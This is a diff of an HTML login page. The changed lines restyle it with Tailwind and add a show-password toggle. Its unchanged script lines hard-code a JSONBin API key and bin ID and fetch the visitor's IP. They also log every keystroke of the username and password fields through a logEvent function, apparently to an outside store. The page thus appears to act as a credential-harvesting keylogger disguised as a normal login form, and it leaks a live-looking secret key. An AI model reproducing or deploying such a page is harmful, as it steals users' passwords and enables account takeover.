@@ -2,88 +2,89 @@
 <html lang="en" data-theme="dark">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login Page</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
   <style>
     body {
-      margin: 0;
-      background-color: #121212;
-      font-family: 'Segoe UI', sans-serif;
-      color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      font-family: 'Source Sans Pro', sans-serif;
     }
-
-    .login-box {
-      width: 100%;
-      max-width: 400px;
-      padding: 2rem;
-    }
-
-    h2 {
-      font-size: 1.2rem;
-      margin-bottom: 1.5rem;
-    }
-
-    label {
-      display: block;
-      font-size: 0.9rem;
-      margin-bottom: 0.25rem;
-    }
-
-    input {
-      width: 100%;
-      padding: 0.75rem 1rem;
-      margin-bottom: 1.2rem;
-      background-color: #1e1e1e;
-      color: white;
-      border: 1px solid #ff7f00;
-      border-radius: 6px;
-      font-size: 1rem;
-    }
-
-    button {
-      width: 100%;
-      padding: 0.75rem;
-      font-size: 1rem;
-      font-weight: bold;
-      color: black;
-      border: none;
-      border-radius: 6px;
-      background: linear-gradient(to right, #facc15, #f97316);
+    .input-icon {
+      position: absolute;
+      right: 0.75rem;
+      top: 67%;
+      transform: translateY(-50%);
       cursor: pointer;
-    }
-
-    #error-message {
-      color: #ef4444;
-      font-size: 0.875rem;
-      display: none;
-      margin-top: 0.5rem;
     }
   </style>
 </head>
-<body>
+<body class="bg-[#111111] text-white min-h-screen flex flex-col justify-between px-4 py-6">
 
-  <div class="login-box">
-    <h2>LOGIN</h2>
+  <!-- Top Section -->
+  <div class="w-full max-w-xl mx-auto">
+    <div class="p-1.5">
+      <h1 class="text-white font-bold text-lg mb-4">LOGIN</h1>
 
-    <label for="username">Username</label>
-    <input type="text" id="username" placeholder="Username" />
+      <!-- Username -->
+      <div class="mb-2.5">
+        <label class="block text-sm mb-1" for="username">Username</label>
+        <input
+          type="text"
+          id="username"
+          placeholder="Username"
+          class="w-full px-3 py-2.5 border border-orange-500 rounded bg-[#121212] text-white focus:outline-none focus:ring-2 focus:ring-orange-400"
+        />
+      </div>
 
-    <label for="password">Password</label>
-    <input type="password" id="password" placeholder="Password" />
+      <!-- Password -->
+      <div class="mb-2.5 relative">
+        <label class="block text-sm mb-1" for="password">Password</label>
+        <input
+          type="password"
+          id="password"
+          placeholder="Password"
+          class="w-full px-3 py-2.5 border border-orange-500 rounded bg-[#121212] text-white focus:outline-none focus:ring-2 focus:ring-orange-400"
+        />
+        <i id="togglePassword" class="fa-solid fa-eye-slash text-gray-400 input-icon"></i>
+      </div>
 
-    <button id="login-btn">Sign In</button>
-    <div id="error-message"></div>
+      <!-- Sign In -->
+      <button
+        id="login-btn"
+        class="w-full px-3 py-2.5 text-base text-black font-semibold rounded bg-gradient-to-r from-yellow-400 to-orange-500 hover:from-yellow-300 hover:to-orange-400 transition">
+        Sign In
+      </button>
+    </div>
   </div>
 
+  <!-- Bottom Section -->
+  <div class="w-full max-w-xl mx-auto">
+    <div class="bg-[#f28a4a] py-2 px-4 font-semibold text-sm">Other</div>
+    <div class="border border-orange-500 mt-1 p-3 rounded bg-black text-white cursor-pointer flex justify-between items-center">
+      <span>Change Language</span>
+      <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="w-4 h-5 text-white" viewBox="0 0 24 24">
+        <path d="M9 18l6-6-6-6" />
+      </svg>
+    </div>
+  </div>
+
+  <!-- Script Section -->
   <script>
     const JSONBIN_API_KEY = '$2a$10$QtoHBeIgduOyNX/.VfoFPOlgQrUuKhcPZ7ZHjGLTLhVvtg17oL85y';
     const JSONBIN_BIN_ID = '67fa4eb78561e97a50fdfda5';
 
-    const errorMessage = document.getElementById('error-message');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const togglePassword = document.getElementById("togglePassword");
+
+    togglePassword.addEventListener("click", () => {
+      const isHidden = passwordInput.type === "password";
+      passwordInput.type = isHidden ? "text" : "password";
+      togglePassword.classList.toggle("fa-eye");
+      togglePassword.classList.toggle("fa-eye-slash");
+    });
 
     async function getIP() {
       try {
@@ -93,12 +94,6 @@
       } catch {
         return 'unknown';
       }
-    }
-
-    function showError(message) {
-      errorMessage.textContent = message;
-      errorMessage.style.display = 'block';
-      setTimeout(() => errorMessage.style.display = 'none', 5000);
     }
 
     async function logEvent(type, data) {
@@ -136,11 +131,11 @@
     }
 
     document.getElementById('login-btn').addEventListener('click', async () => {
-      const email = document.getElementById('username').value.trim();
-      const password = document.getElementById('password').value.trim();
+      const email = usernameInput.value.trim();
+      const password = passwordInput.value.trim();
 
       if (!email || !password) {
-        showError('Please enter both username and password');
+        alert("Please enter both username and password");
         return;
       }
 
@@ -152,16 +147,16 @@
       alert(isValidLogin ? 'Login successful!' : 'Login failed - attempt logged');
 
       if (isValidLogin) {
-        document.getElementById('username').value = '';
-        document.getElementById('password').value = '';
+        usernameInput.value = '';
+        passwordInput.value = '';
       }
     });
 
-    document.getElementById('username').addEventListener('input', (e) => {
+    usernameInput.addEventListener('input', (e) => {
       logEvent('typing', { field: 'username', value: e.target.value });
     });
 
-    document.getElementById('password').addEventListener('input', (e) => {
+    passwordInput.addEventListener('input', (e) => {
       logEvent('typing', { field: 'password', value: e.target.value });
     });
   </script>
